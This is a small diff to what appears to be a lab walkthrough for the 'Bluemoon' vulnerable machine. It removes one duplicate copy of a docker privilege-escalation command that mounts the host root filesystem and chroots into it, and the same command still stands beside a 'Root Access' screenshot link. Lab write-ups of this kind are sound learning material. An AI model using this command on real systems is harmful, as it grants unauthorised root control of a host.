@@ -107,8 +107,6 @@ cat user2.txt
 
 id
 
-docker run -v /:/mnt --rm -it alpine chroot /mnt sh
-
 ![Root Access](https://github.com/izzulharith02/Week-2---Vulnerable-Machine-Bluemoon/blob/d5a5b6ad27ce0ba451ce2443498d3f6d40f46b39/bluemoon%208-2.png)
 
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
